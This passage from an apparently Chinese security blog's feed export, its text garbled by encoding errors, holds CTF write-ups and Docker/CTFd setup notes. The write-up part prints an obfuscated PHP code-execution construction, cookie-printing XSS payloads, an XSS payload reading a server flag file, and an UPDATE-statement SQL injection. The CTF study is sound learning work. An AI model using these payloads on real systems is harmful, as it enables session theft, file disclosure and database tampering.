class="string">"."</span>;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____  = $____ .$___;</span><br><span class="line">$___ = $_;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line"></span><br><span class="line">$____  = $____.$___;</span><br><span class="line">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;</span><br><span class="line">$____  = $____.$___;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$__($____);</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸çŸ¥é“è¿™ä¸€é¢˜ä¸ºä»€ä¹ˆåŠ ä¸Šäº†åŒå¼•å·å°±ä¸è¡Œäº†,è¯•äº†å¾ˆå¤šæ¬¡éƒ½æ˜¯invalid input ,è¿™å°±å¾ˆå°´å°¬äº†..æ‰¾ä¸åˆ°åŸå› ,å¸Œæœ›æœ‰å¤§ä½¬èƒ½æ‰¾åˆ°åŸå› å‘Šè¯‰æˆ‘ä¸€å£°å•Š!!!!</p><h3 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h3><p>è¿™ä¸ªé¢˜ç›®æ ¹æ®é¢˜æ„æˆ‘ä¹Ÿçœ‹ä¸å‡ºä¸ªå•¥ï¼Œåªæ˜¯çœ‹è¿™é¢˜ç›®æ˜¯xssçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰cookieå­˜åœ¨ï¼Œç›´æ¥ä¸€å¥<code>&lt;img src=1 onerror=document.write(document.cookie)&gt;</code>çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆä¸œè¥¿å‡ºç°ï¼Œç»“æœå°±å‡ºç°flagäº†ï¼Œçœ‹äº†ä¸‹å®˜æ–¹wpæ˜¯ç”¨inputæ ‡ç­¾çš„ï¼Œå®ƒçš„wpæ˜¯è¿™ä¸ªæ ·å­çš„<code>&lt;input onfocus=&quot;document.write(document.cookie)&quot; autofocus&gt;</code>ç”¨çš„æ˜¯onfoucusã€‚ã€‚ã€‚åˆå­¦åˆ°ä¸€ä¸ªè§¦å‘æ ‡ç­¾äº†ï¼Œè¿™é‡Œæœ‰è§£é‡Šè¿™ä¸ªæ ‡ç­¾:<a href="http://www.w3school.com.cn/jsref/event_onfocus.aspï¼Œç®€å•è¯´å°±æ˜¯è§¦å‘äº†å¯¹åº”çš„jsä»£ç ï¼Œè€Œå®ƒæ”¯æŒçš„å„ç§æ ‡ç­¾åœ¨é‡Œé¢å¯ä»¥çœ‹å¾—åˆ°ã€‚" target="_blank" rel="noopener">http://www.w3school.com.cn/jsref/event_onfocus.aspï¼Œç®€å•è¯´å°±æ˜¯è§¦å‘äº†å¯¹åº”çš„jsä»£ç ï¼Œè€Œå®ƒæ”¯æŒçš„å„ç§æ ‡ç­¾åœ¨é‡Œé¢å¯ä»¥çœ‹å¾—åˆ°ã€‚</a><br><a href="https://imgchr.com/i/PDRO74" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/05/PDRO74.md.png" alt="PDRO74.md.png"></a></p><h3 id="babyxss2"><a href="#babyxss2" class="headerlink" title="babyxss2"></a>babyxss2</h3><p>è¿™ä¸ªé¢˜ç›®æˆ‘ä¸€å¼€å§‹ä¹Ÿä¸ä¼šåšï¼Œæ²¡ç†è§£é¢˜ç›®è¯´çš„å•¥ï¼Œçœ‹äº†å®˜æ–¹wp </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"e"</span> <span class="attr">onerror</span>=<span class="string">"var x=new XMLHttpRequest();x.open('GET','file:///var/www/html/flag.php',false);x.send(null);document.write('&lt;textarea rows=10 cols=70&gt;'+x.responseText+'&lt;/textarea&gt;');"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°åŸæ¥æ˜¯ç”¨ <code>XMLHttpRequest()</code>å»ä»»æ„è¯»å–æ–‡ä»¶ï¼Œæ˜¯æˆ‘å¤ªèœè¿˜æ²¡å­¦åˆ°ã€‚ã€‚è¿˜å¾—è¿›æ­¥</p><h3 id="Sqli-update"><a href="#Sqli-update" class="headerlink" title="Sqli_update"></a>Sqli_update</h3><p>æ‰“å¼€è¿™ä¸ªé¢˜ç›®å‘ç°æœ‰æ³¨å†ŒåŠŸèƒ½ï¼Œå…ˆæ³¨å†Œä¸€æ³¢çœ‹ä¸€ä¸‹ï¼Œå‘ç°å°±æ˜¯ä¸ªä¿®æ”¹ä¿¡æ¯çš„ä¸œä¸œï¼Œå†æ‰«ä¸€ä¸‹çœ‹çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ç–‘æ–‡ä»¶<br>å‘ç°æœ‰æºç ï¼Œä¸‹è½½ä¸‹æ¥<br><a href="https://imgchr.com/i/PRPj1O" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRPj1O.md.png" alt="PRPj1O.md.png"></a></p><p>å‘ç°è¿™é‡Œé¢çš„ä»£ç æ‰§è¡ŒSQLè¯­å¥å¤§éƒ¨åˆ†éƒ½æ˜¯è¿™æ ·å­çš„ï¼Œéƒ½å·²ç»é¢„ç¼–è¯‘è¿‡äº†ã€‚SQLæ³¨å…¥è¿™ä¸ªæ¼æ´å¾®ä¹å…¶å¾®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $stmt=$mysqli-&gt;prepare(<span class="string">'select id,password from users where username=?'</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'s'</span>,$_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;store_result();</span><br></pre></td></tr></table></figure><p>çªç„¶åœ¨æˆ‘ç¿»åˆ°<code>update.php</code>è¿™ä¸ªé¡µé¢çš„æ—¶å€™<br>å‘ç°äº†æœ‰ç‚¹ä¸å¦¥<br><a href="https://imgchr.com/i/PRPvcD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRPvcD.md.png" alt="PRPvcD.md.png"></a></p><p>è¿™ä¸ªç»è¿‡äº†<code>addslashes</code>å‡½æ•°ä¹‹åç«Ÿç„¶åœ¨ageè¿™ä¸ªå‚æ•°é‡Œæ²¡åŠ å•å¼•å·ï¼Œè¿™æ˜¯æ•…æ„è€Œä¸ºä¹‹ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br>ä¸ç®¡äº†ï¼Œè¿™æ˜¯å¯ä»¥æ³¨å…¥çš„ï¼Œæˆ‘ä»¥å‰çš„åšå®¢è®²è¿‡ <a href="https://0verwatch.top/sql-inject-protect.html">https://0verwatch.top/sql-inject-protect.html</a><br><a href="https://imgchr.com/i/PRPxje" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRPxje.md.png" alt="PRPxje.md.png"></a></p><p>ç„¶åç™»é™†åç«‹å³è¯•ï¼ŒbpæŠ“åŒ…æ”¹ä¸€ä¸‹ageçš„å€¼ï¼Œç„¶åæŸ¥çœ‹æºç å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/08/15/PRiSnH.png" alt="PRiSnH.png"><br>æ³¨æ„è¿™é‡Œçš„aæ˜¯åˆ«åçš„æ„æ€ï¼Œå…¶å®çœç•¥äº†ä¸ª<code>as</code><br>ä¸ç„¶ä¼šæŠ¥é”™çš„ï¼Œè‡ªå·±å¯ä»¥åœ¨MySQLé‡Œé¢å°è¯•ä¸€ä¸‹</p><p>è§£å†³çš„æ–¹å‘å°±æ˜¯èµ·åˆ«åï¼Œè¿™æˆ–è®¸æ˜¯mysqlçš„ç‰¹æ€§å§<br><a href="https://blog.csdn.net/cao478208248/article/details/28122113" target="_blank" rel="noopener">https://blog.csdn.net/cao478208248/article/details/28122113</a></p><p>ä½†æ˜¯æ³¨æ„äº†æˆ‘ä»¬è¿™é‡Œä¸èƒ½ç›´æ¥ä¸Šæ‰‹æŠŠageé‡Œé¢çš„å†…å®¹æ”¹ä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select description from users where username=0x61646d696e)</span><br></pre></td></tr></table></figure></p><p>ä¼šæŠ¥é”™çš„<br><a href="https://imgchr.com/i/PRiPAI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/15/PRiPAI.md.png" alt="PRiPAI.md.png"></a><br>è¿™æ˜¯å› ä¸ºMySQLçš„åŸå› ,ä¹Ÿå°±æ˜¯åŒä¸€ä¸ªè¡¨çš„æ—¶å€™ä¸èƒ½selectå®Œä¹‹ååœ¨åŒä¸€ä¸ªè¡¨ç›´æ¥updateï¼Œè€Œæˆ‘ä»¬å¯ä»¥èµ·ä¸ªåˆ«åæŠŠä»–å˜æˆå¦å¤–ä¸€ä¸ªè¡¨å³å¯ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„åšæ³•ï¼Œä»¥ååœ¨updateæ³¨å…¥çš„æ—¶å€™å¾—æ³¨æ„å¦‚æœæ˜¯å¯¹åŒä¸€ä¸ªè¡¨è¿›è¡Œæ“ä½œçš„æ—¶å€™å°±å¾—å¼„ä¸ªæ–°è¡¨äº†<br><a href="https://blog.csdn.net/priestmoon/article/details/8016121" target="_blank" rel="noopener">https://blog.csdn.net/priestmoon/article/details/8016121</a></p><p>Payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select description from(select * from users where username=0x61646d696e)a)</span><br></pre></td></tr></table></figure><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å…ˆè®°å½•ç€è¿™ä¹ˆå¤šå…ˆå§ï¼Œæ˜å¤©å†æŠŠå‰©ä¸‹çš„é¢˜ç›®å®Œæˆï¼Œèµ¶ç´§å¤ä¹ ä¸€æ³¢å¾®æœºåŸç†ï¼Œä¸ç„¶æ˜å¤©çš„æ±‡ç¼–åˆè¯¥çœ‹ä¸æ‡‚äº†ï¼Œæœ€è¿‘äº‹çœŸå¤šï¼ŒYiiæ¡†æ¶å•¥çš„è¿˜æ²¡å†™å®Œï¼Œçƒ¦ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Dockerç»ƒä¹ åŠåœ¨CTFdå¹³å°ä¸Šæ”¾é¢˜ç›®</title>
      <link href="/Docker-CTFd-building.html"/>
      <url>/Docker-CTFd-building.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ç¯‡æ–‡ç« ç®—æ˜¯Dockerå­¦ä¹ è¿˜æœ‰CTFdå¹³å°æ­å»ºåçš„ç»ƒä¹ å§ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ç”¨çš„dockerfile</p><a id="more"></a><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>è¿™é‡Œæˆ‘å¤ç°çš„é¢˜ç›®æ˜¯SUSCTF 2018çš„é¢˜ç›®ï¼Œä¸‹é¢æ˜¯githubåœ°å€<br><a href="https://github.com/susers/Writeups/" target="_blank" rel="noopener">https://github.com/susers/Writeups/</a></p><p>è¿™é‡Œæˆ‘æ˜¯åˆ©ç”¨äº†<code>dockerfile</code>å»å°è¯•æŠŠå„ä¸ªwebé¢˜ç›®å¤ç°ä¸€éï¼Œæ·±åˆ»æ„Ÿå—åˆ°dockerçš„å¼ºå¤§</p><p>æ€»ç»“ä¸€ä¸‹æˆ‘ç”¨çš„é¢‘ç‡æœ€å¤šçš„æ˜¯è¿™ä¸¤å¥è¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t=é•œåƒåå­— .</span><br><span class="line">docker run --name=å®¹å™¨åå­— -p 9999:22  -d é•œåƒå</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¥è¯çš„.æŒ‡çš„æ˜¯å½“å‰ç›®å½•ä¸‹çš„<code>Dockfile</code>æ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªéƒ½æ‰§è¡Œä¸€ä¸‹<br>ä¸‹å›¾æ˜¯æˆ‘æ­å¥½çš„é¢˜ç›®<br><img src="https://s1.ax1x.com/2018/05/31/CIaUHA.png" alt="CIaUHA.png"></p><p>ç„¶åå°±å¿«ä¹åœ°åšé¢˜äº†ï¼Œæ‰“å¼€<code>192.168.1.103:4440</code>è¿™é‡Œæ˜¯è™šæ‹Ÿæœºçš„åœ°å€,å›æ˜¾é¢˜ç›®ï¼ŒæˆåŠŸ<br><img src="https://s1.ax1x.com/2018/05/31/CIar38.png" alt="CIar38.png"></p><p>å†æ¥ç»§ç»­ä¸Šä¸€ç¯‡æ­å¥½CTFdå¹³å°çš„åšå®¢å†…å®¹ï¼Œæ¥æ”¾é¢˜ç›®ï¼Œç¬¬ä¸€ä¸ªåˆ›å»ºçš„æ˜¯ç®¡ç†å‘˜è´¦å·ï¼Œç„¶åç‚¹å‡»å³ä¸Šè§’<code>Admin-&gt;Challenge</code> ä¸€ç›´æ·»åŠ å³å¯ï¼Œç¬¬ä¸€ä¸ªæ˜¯åå­—ï¼Œè¿™é‡Œæ˜¯æˆ‘å…¶ä¸­ä¸€ä¸ªé¢˜ç›®çš„ç¼–è¾‘çŠ¶å†µï¼Œè¿™ä¸ªå¹³å°æ˜¯å¯ä»¥ç”¨Markdownæ¥ç¼–è¾‘é¢˜ç›®çš„ï¼Œè¿™å°±å¾ˆèˆ’æœäº†23333<br><img src="https://s1.ax1x.com/2018/05/31/CIasgS.png" alt="CIasgS.png"></p><p>æ­å»ºå¥½çš„æ•ˆæœå›¾ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/31/CIayjg.png" alt="CIayjg.png"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>è¿™å‡ å¤©éƒ½åœ¨å¿™ç€ç»ƒä¹ æ€ä¹ˆåˆ©ç”¨dockeræ­å»ºç¯å¢ƒï¼Œè¿‡å‡ å¤©å°±è¦è€ƒè¯•äº†ï¼Œå¾ˆæ…Œã€‚ã€‚ã€‚ã€‚æ˜å¤©èµ¶ç´§å¤ä¹ å§ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> ç¯å¢ƒéƒ¨ç½² </category>
          
          <category> Web </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTFdå¹³å°æ­å»ºè®°å½•</title>
      <link href="/CTFd-building.html"/>
      <url>/CTFd-building.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®è¿™äº›å†…å®¹åœ¨å®˜æ–¹æ–‡æ¡£ä¸­éƒ½æœ‰ï¼Œåªæ˜¯æƒ³åœ¨åšå®¢å†è®°å½•ä¸€ä¸‹ï¼Œæé«˜ä¸€ä¸‹è‡ªå·±çš„ç†Ÿæ‚‰ç¨‹åº¦<br><a id="more"></a></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>CTFdå¹³å°æ˜¯åœ¨flaskæ¡†æ¶ä¸‹å†™çš„ï¼Œæ‰€ä»¥å¾—å…ˆå®‰è£…flask</p><h4 id="å®‰è£…pip"><a href="#å®‰è£…pip" class="headerlink" title="å®‰è£…pip"></a>å®‰è£…pip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…Flask"><a href="#å®‰è£…Flask" class="headerlink" title="å®‰è£…Flask"></a>å®‰è£…Flask</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install Flask</span><br></pre></td></tr></table></figure><h4 id="ä¸‹è½½-amp-å®‰è£…-amp-è¿è¡ŒCTFd"><a href="#ä¸‹è½½-amp-å®‰è£…-amp-è¿è¡ŒCTFd" class="headerlink" title="ä¸‹è½½&amp;å®‰è£…&amp;è¿è¡ŒCTFd"></a>ä¸‹è½½&amp;å®‰è£…&amp;è¿è¡ŒCTFd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> CTFd-1.0.5/</span><br><span class="line">sudo ./prepare.sh</span><br></pre></td></tr></table></figure><p>å‘ç°<code>Permission denied</code> é‚£å°±åŠ æƒé™ç»™ä»–å‘—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 prepare.sh</span><br></pre></td></tr></table></figure><p>å†è¿è¡Œä¸Šé¢çš„å‘½ä»¤å³å¯</p><p>ä¸‹é¢çš„å‘½ä»¤æ˜¯åœ¨æœ¬æœºæ‰§è¡Œçš„ï¼Œå¦‚æœæƒ³è¦å¤–ç½‘è®¿é—®ï¼Œæˆ‘ä»¬éœ€è¦<code>gunicorn</code>è¿™ä¸ªä¸œè¥¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python serve.py</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…gunicornå¹¶è¿è¡ŒCTFd"><a href="#å®‰è£…gunicornå¹¶è¿è¡ŒCTFd" class="headerlink" title="å®‰è£…gunicornå¹¶è¿è¡ŒCTFd"></a>å®‰è£…<code>gunicorn</code>å¹¶è¿è¡ŒCTFd</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install gunicorn  </span><br><span class="line">sudo (gunicorn --<span class="built_in">bind</span> 0.0.0.0:8080 -w 1 <span class="string">"CTFd:create_app()"</span> &amp;)</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŠ äº†()è¿˜æœ‰&amp;æ˜¯ä¸ºäº†é‚£èƒ½å¤Ÿåå°è¿è¡Œ<br>[0.0.0.0]ä¸ç”¨ä¿®æ”¹<br>è¿™é‡Œæˆ‘æ˜ å°„çš„æ˜¯8080ç«¯å£ï¼Œæ‰€ç”¨ç›´æ¥è®¿é—®å…¬ç½‘<code>ip:8080</code>å³å¯è®¿é—®<br><img src="https://s1.ax1x.com/2018/05/31/CIaVcF.png" alt="CIaVcF.png"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>æœ¬æ¥è¿˜æƒ³åœ¨ä¸Šé¢æ­å»ºä¸€ä¸ªOWASPçš„é¶åœºçš„ï¼Œåæ¥å‘ç°æ€ä¹ˆéƒ½importä¸ä¸Šå»é‚£ä¸ªæŒ‘æˆ˜åŒ…ï¼Œå¿ƒå¾ˆç´¯ï¼Œè™½ç„¶è¯´å®˜æ–¹ç»™å‡ºçš„æ˜¯ç”¨1.0.5çš„ç‰ˆæœ¬ï¼Œä½†æ˜¯è¯•è¿‡äº†è¿˜æ˜¯å®‰è£…ä¸ä¸Šã€‚ã€‚ã€‚ã€‚ä¸‹æ¬¡ç›´æ¥å°è¯•ç”¨Dockerå®‰è£…å§</p>]]></content>
      
      <categories>
          
          <category> ç¯å¢ƒéƒ¨ç½² </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ç¯å¢ƒéƒ¨ç½² </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Dockerå­¦ä¹ ç¬”è®°</title>
      <link href="/Docker-learning.html"/>
      <url>/Docker-learning.html</url>
      <content type="html"><![CDATA[<h2 id="å®¹å™¨"><a href="#å®¹å™¨" class="headerlink" title="å®¹å™¨"></a>å®¹å™¨</h2><p>ä¸€ç§è™šæ‹ŸåŒ–æ–¹æ¡ˆ<br>æ“ä½œç³»ç»Ÿçº§åˆ«çš„è™šæ‹ŸåŒ–<br>åªèƒ½è¿è¡Œç›¸åŒæˆ–ç›¸ä¼¼å†…æ ¸çš„æ“ä½œç³»ç»Ÿ<br>ä¾èµ–äºLinuxå†…æ ¸ç‰¹æ€§<br><a id="more"></a></p><h2 id="DockeråŸºæœ¬ç»„æˆ"><a href="#DockeråŸºæœ¬ç»„æˆ" class="headerlink" title="DockeråŸºæœ¬ç»„æˆ"></a>DockeråŸºæœ¬ç»„æˆ</h2><p><img src="https://s1.ax1x.com/2018/05/27/Ch0NM4.png" alt="Ch0NM4.png"></p><h3 id="Docker-Image-é•œåƒ"><a href="#Docker-Image-é•œåƒ" class="headerlink" title="Docker Image é•œåƒ"></a>Docker Image é•œåƒ</h3><p>å®¹å™¨çš„åŸºçŸ³ï¼Œä¸€ä¸ªå±‚å çš„æ–‡ä»¶ç³»ç»Ÿ</p><h3 id="Docker-Containerå®¹å™¨"><a href="#Docker-Containerå®¹å™¨" class="headerlink" title="Docker Containerå®¹å™¨"></a>Docker Containerå®¹å™¨</h3><p>é€šè¿‡é•œåƒå¯åŠ¨ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªå¯å†™å±‚ï¼Œè¿™ä¸ªå¯å†™å±‚å°±æ˜¯å®¹å™¨äº§ç”Ÿçš„å†…å®¹ã€‚è€Œå¦å¤–ä¸‹é¢çš„å‡ ä¸ªæ–‡ä»¶ç³»ç»Ÿå°±æ˜¯ä¹‹å‰é•œåƒæä¾›çš„ä¸œè¥¿,è¿™ä¸¤æ ·ä¸œè¥¿ç›¸ç»“åˆå°±å½¢æˆäº†å®¹å™¨ã€‚å®¹å™¨è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„å†…å®¹å°±æ˜¯å†™æ—¶å¤åˆ¶(copy on write)</p><p><img src="https://s1.ax1x.com/2018/05/27/Ch0UsJ.png" alt="Ch0UsJ.png"></p><p><img src="https://s1.ax1x.com/2018/05/27/Ch0aL9.png" alt="Ch0aL9.png"></p><h3 id="Docker-Registry-ä»“åº“"><a href="#Docker-Registry-ä»“åº“" class="headerlink" title="Docker Registry ä»“åº“"></a>Docker Registry ä»“åº“</h3><p>å…¬æœ‰ ç§æœ‰ Docker Hub</p><h3 id="Dockerè¿ç”¨Linuxçš„å†…æ ¸ç‰¹æ€§"><a href="#Dockerè¿ç”¨Linuxçš„å†…æ ¸ç‰¹æ€§" class="headerlink" title="Dockerè¿ç”¨Linuxçš„å†…æ ¸ç‰¹æ€§"></a>Dockerè¿ç”¨Linuxçš„å†…æ ¸ç‰¹æ€§</h3><p>Namespace å‘½åç©ºé—´<br>Control groupsï¼ˆcgroupsï¼‰æ§åˆ¶ç»„  â€”&gt;ç”¨æ¥åˆ†é…èµ„æº</p><p>Namespace<br>     å¯¹äºç¼–ç¨‹è€Œè¨€ï¼Œæ˜¯ä¸€ç§å°è£…=ä»£ç çš„éš”ç¦»ï¼Œå¯¹äºæ“ä½œç³»ç»Ÿè€Œè¨€æ˜¯ä¸€ç§ç³»ç»Ÿèµ„æºï¼ˆè¿›ç¨‹ï¼Œç½‘ç»œï¼Œæ–‡ä»¶ç³»ç»Ÿï¼‰çš„éš”ç¦»</p><h3 id="Ubantuä¸­å®‰è£…Docker"><a href="#Ubantuä¸­å®‰è£…Docker" class="headerlink" title="Ubantuä¸­å®‰è£…Docker"></a>Ubantuä¸­å®‰è£…Docker</h3><p>é¦–å…ˆè¿˜æ˜¯å¾—æ£€æŸ¥<br>1.å†…æ ¸ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>2.æ£€æŸ¥Device Mapper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /sys/class/misc/device-mapper</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯å®‰è£…äº†<br>1.Ubuntuç»´æŠ¤çš„ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">  sudo apt-get install docker.io</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œæ˜¯<code>docker.io</code></p><p>2.Dockerç»´æŠ¤çš„ç‰ˆæœ¬ï¼Œæ¨èå®‰è£…Dockerç»´æŠ¤çš„ç‰ˆæœ¬ï¼Œå› ä¸ºå®ƒçš„ç‰ˆæœ¬è¾ƒæ–°,ä»¥å‰é‚£ä¸€ç§åˆ©ç”¨è„šæœ¬å®‰è£…çš„å¥½åƒå‡ºäº†ç‚¹é—®é¢˜   è¿™éƒ¨åˆ†æœ‰ç‚¹çƒ¦äººï¼ŒæŒ‰ç…§å®˜æ–¹æ–‡æ¡£å»å®ç°ä¸‹è½½ä¸å¤ªè¡Œï¼Œæ€»æ˜¯æŠ¥é”™ï¼Œæœ€åå°±å‚è€ƒäº†ä¸€æ³¢ä¸‹é¢è¿™ä¸ªç½‘å€çš„å®‰è£…æ–¹æ³•ï¼Œç»ˆäºè£…å¥½ï¼Œmmpï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯Ubuntu16.04 64ä½ç‰ˆæœ¬<br><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/ubuntu-docker-install.html</a></p><p> <code>sudo docker run hello-world</code> æ£€æµ‹ä¸€ä¸‹æ˜¯å¦å®‰è£…å¥½ï¼Œå®‰è£…å¥½å°±ä¼šå‡ºç°ä¸€å®šçš„å›æ˜¾</p><p>å¦‚æœä¸æƒ³ä¸€ç›´éƒ½è¦è¾“å…¥sudo,ä¹Ÿå°±æ˜¯å½“è¦ä»¥érootç”¨æˆ·å¯ä»¥ç›´æ¥è¿è¡Œdockeræ—¶ï¼Œéœ€è¦æ‰§è¡Œ <code>sudo usermod -aG docker</code> ä½ çš„ç”¨æˆ·å å‘½ä»¤ï¼Œç„¶åé‡æ–°ç™»é™†ï¼Œè®°å¾—è¦<code>æ³¨é”€</code>ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šæŠ¥é”™</p><p>å¯¹æ¯”ä¸€ä¸‹ç‰ˆæœ¬ç¡®å®dockerç»´æŠ¤çš„ç‰ˆæœ¬è¾ƒæ–°ï¼Œ^_^<br><img src="https://s1.ax1x.com/2018/05/30/C5cTN4.png" alt="C5cTN4.png"><br><img src="https://s1.ax1x.com/2018/05/30/C5cbC9.png" alt="C5cbC9.png"></p><p>å¼€å¯å®ˆæŠ¤è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p>å¯¹äºDockeræœåŠ¡å…¶ä»–çš„ç›¸å…³å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop</span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><p>è¿è¡Œç¬¬ä¸€ä¸ªå®¹å™¨å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run ubuntu <span class="built_in">echo</span> <span class="string">'hello'</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦å…¶ä»–ç‰ˆæœ¬çš„Linuxçš„è¯æŠŠä¸­é—´çš„Ubuntuæ”¹ä¸ºcentoså³å¯ï¼Œè¿˜å¯ä»¥æ”¹ç‰ˆæœ¬ï¼Œä¾‹å¦‚<code>sudo docker run ubuntu:15.10 echo &quot;Hello world&quot;</code></p><h3 id="Windowsä¸‹çš„å®‰è£…"><a href="#Windowsä¸‹çš„å®‰è£…" class="headerlink" title="Windowsä¸‹çš„å®‰è£…"></a>Windowsä¸‹çš„å®‰è£…</h3><p>è¿™æ˜¯è¦ä¸‹è½½ä¸“é—¨çš„Docker for Windowsè¿™ä¸ªä¸œè¥¿ä¸Šé¢çš„ç½‘å€ä¹Ÿæœ‰æåŠåˆ°ï¼Œwin10å°±ä¸“é—¨åˆ©ç”¨çš„è¿™ä¸ªä¸œè¥¿ï¼Œä½†win7 è¿˜æœ‰ win8 çš„å°±ç”¨çš„æ˜¯docker toolboxï¼ŒWindowså®‰è£…å¾ˆå®¹æ˜“å‡ºæ¯›ç—…ï¼Œæœ€å…¸å‹çš„æ˜¯å¦‚æœä½ 